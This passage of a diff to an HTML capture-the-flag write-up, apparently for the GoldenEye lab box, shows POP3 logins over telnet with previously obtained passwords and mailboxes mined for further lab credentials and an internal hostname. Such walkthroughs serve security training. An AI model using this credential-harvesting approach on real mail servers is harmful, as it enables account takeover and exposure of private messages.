+<span class="normal"><a href="#__codelineno-17-15">15</a></span>
+<span class="normal"><a href="#__codelineno-17-16">16</a></span>
+<span class="normal"><a href="#__codelineno-17-17">17</a></span>
+<span class="normal"><a href="#__codelineno-17-18">18</a></span>
+<span class="normal"><a href="#__codelineno-17-19">19</a></span>
+<span class="normal"><a href="#__codelineno-17-20">20</a></span>
+<span class="normal"><a href="#__codelineno-17-21">21</a></span>
+<span class="normal"><a href="#__codelineno-17-22">22</a></span>
+<span class="normal"><a href="#__codelineno-17-23">23</a></span>
+<span class="normal"><a href="#__codelineno-17-24">24</a></span>
+<span class="normal"><a href="#__codelineno-17-25">25</a></span>
+<span class="normal"><a href="#__codelineno-17-26">26</a></span>
+<span class="normal"><a href="#__codelineno-17-27">27</a></span>
+<span class="normal"><a href="#__codelineno-17-28">28</a></span>
+<span class="normal"><a href="#__codelineno-17-29">29</a></span>
+<span class="normal"><a href="#__codelineno-17-30">30</a></span>
+<span class="normal"><a href="#__codelineno-17-31">31</a></span>
+<span class="normal"><a href="#__codelineno-17-32">32</a></span>
+<span class="normal"><a href="#__codelineno-17-33">33</a></span>
+<span class="normal"><a href="#__codelineno-17-34">34</a></span>
+<span class="normal"><a href="#__codelineno-17-35">35</a></span>
+<span class="normal"><a href="#__codelineno-17-36">36</a></span>
+<span class="normal"><a href="#__codelineno-17-37">37</a></span>
+<span class="normal"><a href="#__codelineno-17-38">38</a></span>
+<span class="normal"><a href="#__codelineno-17-39">39</a></span>
+<span class="normal"><a href="#__codelineno-17-40">40</a></span>
+<span class="normal"><a href="#__codelineno-17-41">41</a></span>
+<span class="normal"><a href="#__codelineno-17-42">42</a></span>
+<span class="normal"><a href="#__codelineno-17-43">43</a></span>
+<span class="normal"><a href="#__codelineno-17-44">44</a></span>
+<span class="normal"><a href="#__codelineno-17-45">45</a></span>
+<span class="normal"><a href="#__codelineno-17-46">46</a></span>
+<span class="normal"><a href="#__codelineno-17-47">47</a></span>
+<span class="normal"><a href="#__codelineno-17-48">48</a></span>
+<span class="normal"><a href="#__codelineno-17-49">49</a></span>
+<span class="normal"><a href="#__codelineno-17-50">50</a></span>
+<span class="normal"><a href="#__codelineno-17-51">51</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>RETR 1
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>+OK 544 octets
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a>Return-Path: &lt;root@127.0.0.1.goldeneye&gt;
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a>X-Original-To: boris
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5"></a>Delivered-To: boris@ubuntu
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6"></a>Received: from ok (localhost [127.0.0.1])
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7"></a>        by ubuntu (Postfix) with SMTP id D9E47454B1
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8"></a>        for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9"></a>Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10"></a>Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11"></a>From: root@127.0.0.1.goldeneye
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12"></a>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13"></a>Boris, this is admin. You can electronically communicate to co-workers and students here. I&#39;m not going to scan emails for security risks because I trust you and the other admins here.
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14"></a>.
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15"></a>RETR 2
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16"></a>+OK 373 octets
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17"></a>Return-Path: &lt;natalya@ubuntu&gt;
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18"></a>X-Original-To: boris
+</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19"></a>Delivered-To: boris@ubuntu
+</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20"></a>Received: from ok (localhost [127.0.0.1])
+</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21"></a>        by ubuntu (Postfix) with ESMTP id C3F2B454B1
+</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22"></a>        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23"></a>Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;
+</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24"></a>Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25"></a>From: natalya@ubuntu
+</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26"></a>
+</span><span id="__span-17-27"><a id="__codelineno-17-27" name="__codelineno-17-27"></a>Boris, I can break your codes!
+</span><span id="__span-17-28"><a id="__codelineno-17-28" name="__codelineno-17-28"></a>.
+</span><span id="__span-17-29"><a id="__codelineno-17-29" name="__codelineno-17-29"></a>RETR 3
+</span><span id="__span-17-30"><a id="__codelineno-17-30" name="__codelineno-17-30"></a>+OK 921 octets
+</span><span id="__span-17-31"><a id="__codelineno-17-31" name="__codelineno-17-31"></a>Return-Path: &lt;alec@janus.boss&gt;
+</span><span id="__span-17-32"><a id="__codelineno-17-32" name="__codelineno-17-32"></a>X-Original-To: boris
+</span><span id="__span-17-33"><a id="__codelineno-17-33" name="__codelineno-17-33"></a>Delivered-To: boris@ubuntu
+</span><span id="__span-17-34"><a id="__codelineno-17-34" name="__codelineno-17-34"></a>Received: from janus (localhost [127.0.0.1])
+</span><span id="__span-17-35"><a id="__codelineno-17-35" name="__codelineno-17-35"></a>        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+</span><span id="__span-17-36"><a id="__codelineno-17-36" name="__codelineno-17-36"></a>        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+</span><span id="__span-17-37"><a id="__codelineno-17-37" name="__codelineno-17-37"></a>Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;
+</span><span id="__span-17-38"><a id="__codelineno-17-38" name="__codelineno-17-38"></a>Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+</span><span id="__span-17-39"><a id="__codelineno-17-39" name="__codelineno-17-39"></a>From: alec@janus.boss
+</span><span id="__span-17-40"><a id="__codelineno-17-40" name="__codelineno-17-40"></a>
+</span><span id="__span-17-41"><a id="__codelineno-17-41" name="__codelineno-17-41"></a>Boris,
+</span><span id="__span-17-42"><a id="__codelineno-17-42" name="__codelineno-17-42"></a>
+</span><span id="__span-17-43"><a id="__codelineno-17-43" name="__codelineno-17-43"></a>Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+</span><span id="__span-17-44"><a id="__codelineno-17-44" name="__codelineno-17-44"></a>
+</span><span id="__span-17-45"><a id="__codelineno-17-45" name="__codelineno-17-45"></a>Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+</span><span id="__span-17-46"><a id="__codelineno-17-46" name="__codelineno-17-46"></a>
+</span><span id="__span-17-47"><a id="__codelineno-17-47" name="__codelineno-17-47"></a>PS - Keep security tight or we will be compromised.
+</span><span id="__span-17-48"><a id="__codelineno-17-48" name="__codelineno-17-48"></a>
+</span><span id="__span-17-49"><a id="__codelineno-17-49" name="__codelineno-17-49"></a>.
+</span><span id="__span-17-50"><a id="__codelineno-17-50" name="__codelineno-17-50"></a>RETR 5
+</span><span id="__span-17-51"><a id="__codelineno-17-51" name="__codelineno-17-51"></a>-ERR There&#39;s no message 5.
+</span></code></pre></div></td></tr></table></div>
 <p>Now, let's do the same for natalya:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>└─$<span class="w"> </span>telnet<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span><span class="m">55007</span>
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Trying<span class="w"> </span><span class="m">192</span>.168.56.101...
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>Connected<span class="w"> </span>to<span class="w"> </span><span class="m">192</span>.168.56.101.
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>Escape<span class="w"> </span>character<span class="w"> </span>is<span class="w"> </span><span class="s1">&#39;^]&#39;</span>.
-</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>+OK<span class="w"> </span>GoldenEye<span class="w"> </span>POP3<span class="w"> </span>Electronic-Mail<span class="w"> </span>System
-</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>user<span class="w"> </span>natalya
-</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>+OK
-</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>pass<span class="w"> </span>bird
-</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>+OK<span class="w"> </span>Logged<span class="w"> </span><span class="k">in</span>.
-</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>list
-</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>+OK<span class="w"> </span><span class="m">2</span><span class="w"> </span>messages:
-</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="m">1</span><span class="w"> </span><span class="m">631</span>
-</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="m">2</span><span class="w"> </span><span class="m">1048</span>
-</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>.
-</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>retr<span class="w"> </span><span class="m">1</span>
-</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>+OK<span class="w"> </span><span class="m">631</span><span class="w"> </span>octets
-</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>Return-Path:<span class="w"> </span>&lt;root@ubuntu&gt;
-</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>X-Original-To:<span class="w"> </span>natalya
-</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>Delivered-To:<span class="w"> </span>natalya@ubuntu
-</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a>Received:<span class="w"> </span>from<span class="w"> </span>ok<span class="w"> </span><span class="o">(</span>localhost<span class="w"> </span><span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">])</span>
-</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a><span class="w">        </span>by<span class="w"> </span>ubuntu<span class="w"> </span><span class="o">(</span>Postfix<span class="o">)</span><span class="w"> </span>with<span class="w"> </span>ESMTP<span class="w"> </span>id<span class="w"> </span>D5EDA454B1
-</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span>&lt;natalya&gt;<span class="p">;</span><span class="w"> </span>Tue,<span class="w"> </span><span class="m">10</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">1995</span><span class="w"> </span><span class="m">19</span>:45:33<span class="w"> </span>-0700<span class="w"> </span><span class="o">(</span>PDT<span class="o">)</span>
-</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a>Message-Id:<span class="w"> </span>&lt;<span class="m">20180425024542</span>.D5EDA454B1@ubuntu&gt;
-</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>Date:<span class="w"> </span>Tue,<span class="w"> </span><span class="m">10</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">1995</span><span class="w"> </span><span class="m">19</span>:45:33<span class="w"> </span>-0700<span class="w"> </span><span class="o">(</span>PDT<span class="o">)</span>
-</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a>From:<span class="w"> </span>root@ubuntu
-</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a>
-</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a>Natalya,<span class="w"> </span>please<span class="w"> </span>you<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>stop<span class="w"> </span>breaking<span class="w"> </span>boris<span class="s1">&#39; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span>
-</span><span id="__span-18-28"><a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a>
-</span><span id="__span-18-29"><a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a><span class="s1">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span>
-</span><span id="__span-18-30"><a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a><span class="s1">.</span>
-</span><span id="__span-18-31"><a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a><span class="s1">retr 2</span>
-</span><span id="__span-18-32"><a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a><span class="s1">+OK 1048 octets</span>
-</span><span id="__span-18-33"><a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a><span class="s1">Return-Path: &lt;root@ubuntu&gt;</span>
-</span><span id="__span-18-34"><a id="__codelineno-18-34" name="__codelineno-18-34" href="#__codelineno-18-34"></a><span class="s1">X-Original-To: natalya</span>
-</span><span id="__span-18-35"><a id="__codelineno-18-35" name="__codelineno-18-35" href="#__codelineno-18-35"></a><span class="s1">Delivered-To: natalya@ubuntu</span>
-</span><span id="__span-18-36"><a id="__codelineno-18-36" name="__codelineno-18-36" href="#__codelineno-18-36"></a><span class="s1">Received: from root (localhost [127.0.0.1])</span>
-</span><span id="__span-18-37"><a id="__codelineno-18-37" name="__codelineno-18-37" href="#__codelineno-18-37"></a><span class="s1">        by ubuntu (Postfix) with SMTP id 17C96454B1</span>
-</span><span id="__span-18-38"><a id="__codelineno-18-38" name="__codelineno-18-38" href="#__codelineno-18-38"></a><span class="s1">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span>
-</span><span id="__span-18-39"><a id="__codelineno-18-39" name="__codelineno-18-39" href="#__codelineno-18-39"></a><span class="s1">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span>
-</span><span id="__span-18-40"><a id="__codelineno-18-40" name="__codelineno-18-40" href="#__codelineno-18-40"></a><span class="s1">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span>
-</span><span id="__span-18-41"><a id="__codelineno-18-41" name="__codelineno-18-41" href="#__codelineno-18-41"></a><span class="s1">From: root@ubuntu</span>
-</span><span id="__span-18-42"><a id="__codelineno-18-42" name="__codelineno-18-42" href="#__codelineno-18-42"></a>
-</span><span id="__span-18-43"><a id="__codelineno-18-43" name="__codelineno-18-43" href="#__codelineno-18-43"></a><span class="s1">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#39;</span>s<span class="w"> </span>related<span class="w"> </span>to<span class="w"> </span>security...even<span class="w"> </span><span class="k">if</span><span class="w"> </span>it<span class="s1">&#39;s not, just enter it in under the guise of &quot;security&quot;...it&#39;</span>ll<span class="w"> </span>get<span class="w"> </span>the<span class="w"> </span>change<span class="w"> </span>order<span class="w"> </span>escalated<span class="w"> </span>without<span class="w"> </span>much<span class="w"> </span>hassle<span class="w"> </span>:<span class="o">)</span>
-</span><span id="__span-18-44"><a id="__codelineno-18-44" name="__codelineno-18-44" href="#__codelineno-18-44"></a>
-</span><span id="__span-18-45"><a id="__codelineno-18-45" name="__codelineno-18-45" href="#__codelineno-18-45"></a>Ok,<span class="w"> </span>user<span class="w"> </span>creds<span class="w"> </span>are:
-</span><span id="__span-18-46"><a id="__codelineno-18-46" name="__codelineno-18-46" href="#__codelineno-18-46"></a>
-</span><span id="__span-18-47"><a id="__codelineno-18-47" name="__codelineno-18-47" href="#__codelineno-18-47"></a>username:<span class="w"> </span>xenia
-</span><span id="__span-18-48"><a id="__codelineno-18-48" name="__codelineno-18-48" href="#__codelineno-18-48"></a>password:<span class="w"> </span>RCP90rulez!
-</span><span id="__span-18-49"><a id="__codelineno-18-49" name="__codelineno-18-49" href="#__codelineno-18-49"></a>
-</span><span id="__span-18-50"><a id="__codelineno-18-50" name="__codelineno-18-50" href="#__codelineno-18-50"></a>Boris<span class="w"> </span>verified<span class="w"> </span>her<span class="w"> </span>as<span class="w"> </span>a<span class="w"> </span>valid<span class="w"> </span>contractor<span class="w"> </span>so<span class="w"> </span>just<span class="w"> </span>create<span class="w"> </span>the<span class="w"> </span>account<span class="w"> </span>ok?
-</span><span id="__span-18-51"><a id="__codelineno-18-51" name="__codelineno-18-51" href="#__codelineno-18-51"></a>
-</span><span id="__span-18-52"><a id="__codelineno-18-52" name="__codelineno-18-52" href="#__codelineno-18-52"></a>And<span class="w"> </span><span class="k">if</span><span class="w"> </span>you<span class="w"> </span>didn<span class="s1">&#39;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span>
-</span><span id="__span-18-53"><a id="__codelineno-18-53" name="__codelineno-18-53" href="#__codelineno-18-53"></a><span class="s1">**Make sure to edit your host file since you usually work remote off-network....</span>
-</span><span id="__span-18-54"><a id="__codelineno-18-54" name="__codelineno-18-54" href="#__codelineno-18-54"></a>
-</span><span id="__span-18-55"><a id="__codelineno-18-55" name="__codelineno-18-55" href="#__codelineno-18-55"></a><span class="s1">Since you&#39;</span>re<span class="w"> </span>a<span class="w"> </span>Linux<span class="w"> </span>user<span class="w"> </span>just<span class="w"> </span>point<span class="w"> </span>this<span class="w"> </span>servers<span class="w"> </span>IP<span class="w"> </span>to<span class="w"> </span>severnaya-station.com<span class="w"> </span><span class="k">in</span><span class="w"> </span>/etc/hosts.
-</span><span id="__span-18-56"><a id="__codelineno-18-56" name="__codelineno-18-56" href="#__codelineno-18-56"></a>.
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-18-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-18-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-18-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-18-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-18-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-18-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-18-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-18-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-18-10">10</a></span>
+<span class="normal"><a href="#__codelineno-18-11">11</a></span>
+<span class="normal"><a href="#__codelineno-18-12">12</a></span>
+<span class="normal"><a href="#__codelineno-18-13">13</a></span>
+<span class="normal"><a href="#__codelineno-18-14">14</a></span>
+<span class="normal"><a href="#__codelineno-18-15">15</a></span>
+<span class="normal"><a href="#__codelineno-18-16">16</a></span>
+<span class="normal"><a href="#__codelineno-18-17">17</a></span>
+<span class="normal"><a href="#__codelineno-18-18">18</a></span>
+<span class="normal"><a href="#__codelineno-18-19">19</a></span>
+<span class="normal"><a href="#__codelineno-18-20">20</a></span>
+<span class="normal"><a href="#__codelineno-18-21">21</a></span>
+<span class="normal"><a href="#__codelineno-18-22">22</a></span>
+<span class="normal"><a href="#__codelineno-18-23">23</a></span>
+<span class="normal"><a href="#__codelineno-18-24">24</a></span>
+<span class="normal"><a href="#__codelineno-18-25">25</a></span>
+<span class="normal"><a href="#__codelineno-18-26">26</a></span>
+<span class="normal"><a href="#__codelineno-18-27">27</a></span>
+<span class="normal"><a href="#__codelineno-18-28">28</a></span>
+<span class="normal"><a href="#__codelineno-18-29">29</a></span>
+<span class="normal"><a href="#__codelineno-18-30">30</a></span>
+<span class="normal"><a href="#__codelineno-18-31">31</a></span>
+<span class="normal"><a href="#__codelineno-18-32">32</a></span>
+<span class="normal"><a href="#__codelineno-18-33">33</a></span>
+<span class="normal"><a href="#__codelineno-18-34">34</a></span>
+<span class="normal"><a href="#__codelineno-18-35">35</a></span>
+<span class="normal"><a href="#__codelineno-18-36">36</a></span>
+<span class="normal"><a href="#__codelineno-18-37">37</a></span>
+<span class="normal"><a href="#__codelineno-18-38">38</a></span>
+<span class="normal"><a href="#__codelineno-18-39">39</a></span>
+<span class="normal"><a href="#__codelineno-18-40">40</a></span>
+<span class="normal"><a href="#__codelineno-18-41">41</a></span>
+<span class="normal"><a href="#__codelineno-18-42">42</a></span>
+<span class="normal"><a href="#__codelineno-18-43">43</a></span>
+<span class="normal"><a href="#__codelineno-18-44">44</a></span>
+<span class="normal"><a href="#__codelineno-18-45">45</a></span>
+<span class="normal"><a href="#__codelineno-18-46">46</a></span>
+<span class="normal"><a href="#__codelineno-18-47">47</a></span>
+<span class="normal"><a href="#__codelineno-18-48">48</a></span>
+<span class="normal"><a href="#__codelineno-18-49">49</a></span>
+<span class="normal"><a href="#__codelineno-18-50">50</a></span>
+<span class="normal"><a href="#__codelineno-18-51">51</a></span>
+<span class="normal"><a href="#__codelineno-18-52">52</a></span>
+<span class="normal"><a href="#__codelineno-18-53">53</a></span>
+<span class="normal"><a href="#__codelineno-18-54">54</a></span>
+<span class="normal"><a href="#__codelineno-18-55">55</a></span>
+<span class="normal"><a href="#__codelineno-18-56">56</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>└─$<span class="w"> </span>telnet<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span><span class="m">55007</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a>Trying<span class="w"> </span><span class="m">192</span>.168.56.101...
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a>Connected<span class="w"> </span>to<span class="w"> </span><span class="m">192</span>.168.56.101.
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a>Escape<span class="w"> </span>character<span class="w"> </span>is<span class="w"> </span><span class="s1">&#39;^]&#39;</span>.
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a>+OK<span class="w"> </span>GoldenEye<span class="w"> </span>POP3<span class="w"> </span>Electronic-Mail<span class="w"> </span>System
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6"></a>user<span class="w"> </span>natalya
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7"></a>+OK
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8"></a>pass<span class="w"> </span>bird
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9"></a>+OK<span class="w"> </span>Logged<span class="w"> </span><span class="k">in</span>.
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10"></a>list
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11"></a>+OK<span class="w"> </span><span class="m">2</span><span class="w"> </span>messages:
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12"></a><span class="m">1</span><span class="w"> </span><span class="m">631</span>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13"></a><span class="m">2</span><span class="w"> </span><span class="m">1048</span>
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14"></a>.
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15"></a>retr<span class="w"> </span><span class="m">1</span>
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16"></a>+OK<span class="w"> </span><span class="m">631</span><span class="w"> </span>octets
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17"></a>Return-Path:<span class="w"> </span>&lt;root@ubuntu&gt;
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18"></a>X-Original-To:<span class="w"> </span>natalya
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19"></a>Delivered-To:<span class="w"> </span>natalya@ubuntu
+</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20"></a>Received:<span class="w"> </span>from<span class="w"> </span>ok<span class="w"> </span><span class="o">(</span>localhost<span class="w"> </span><span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">])</span>
+</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21"></a><span class="w">        </span>by<span class="w"> </span>ubuntu<span class="w"> </span><span class="o">(</span>Postfix<span class="o">)</span><span class="w"> </span>with<span class="w"> </span>ESMTP<span class="w"> </span>id<span class="w"> </span>D5EDA454B1
+</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span>&lt;natalya&gt;<span class="p">;</span><span class="w"> </span>Tue,<span class="w"> </span><span class="m">10</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">1995</span><span class="w"> </span><span class="m">19</span>:45:33<span class="w"> </span>-0700<span class="w"> </span><span class="o">(</span>PDT<span class="o">)</span>
+</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23"></a>Message-Id:<span class="w"> </span>&lt;<span class="m">20180425024542</span>.D5EDA454B1@ubuntu&gt;
+</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24"></a>Date:<span class="w"> </span>Tue,<span class="w"> </span><span class="m">10</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">1995</span><span class="w"> </span><span class="m">19</span>:45:33<span class="w"> </span>-0700<span class="w"> </span><span class="o">(</span>PDT<span class="o">)</span>
+</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25"></a>From:<span class="w"> </span>root@ubuntu
+</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26"></a>
+</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27"></a>Natalya,<span class="w"> </span>please<span class="w"> </span>you<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>stop<span class="w"> </span>breaking<span class="w"> </span>boris<span class="s1">&#39; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span>
+</span><span id="__span-18-28"><a id="__codelineno-18-28" name="__codelineno-18-28"></a>
+</span><span id="__span-18-29"><a id="__codelineno-18-29" name="__codelineno-18-29"></a><span class="s1">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span>
+</span><span id="__span-18-30"><a id="__codelineno-18-30" name="__codelineno-18-30"></a><span class="s1">.</span>
+</span><span id="__span-18-31"><a id="__codelineno-18-31" name="__codelineno-18-31"></a><span class="s1">retr 2</span>
+</span><span id="__span-18-32"><a id="__codelineno-18-32" name="__codelineno-18-32"></a><span class="s1">+OK 1048 octets</span>
+</span><span id="__span-18-33"><a id="__codelineno-18-33" name="__codelineno-18-33"></a><span class="s1">Return-Path: &lt;root@ubuntu&gt;</span>
+</span><span id="__span-18-34"><a id="__codelineno-18-34" name="__codelineno-18-34"></a><span class="s1">X-Original-To: natalya</span>
+</span><span id="__span-18-35"><a id="__codelineno-18-35" name="__codelineno-18-35"></a><span class="s1">Delivered-To: natalya@ubuntu</span>
+</span><span id="__span-18-36"><a id="__codelineno-18-36" name="__codelineno-18-36"></a><span class="s1">Received: from root (localhost [127.0.0.1])</span>
+</span><span id="__span-18-37"><a id="__codelineno-18-37" name="__codelineno-18-37"></a><span class="s1">        by ubuntu (Postfix) with SMTP id 17C96454B1</span>
+</span><span id="__span-18-38"><a id="__codelineno-18-38" name="__codelineno-18-38"></a><span class="s1">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span>
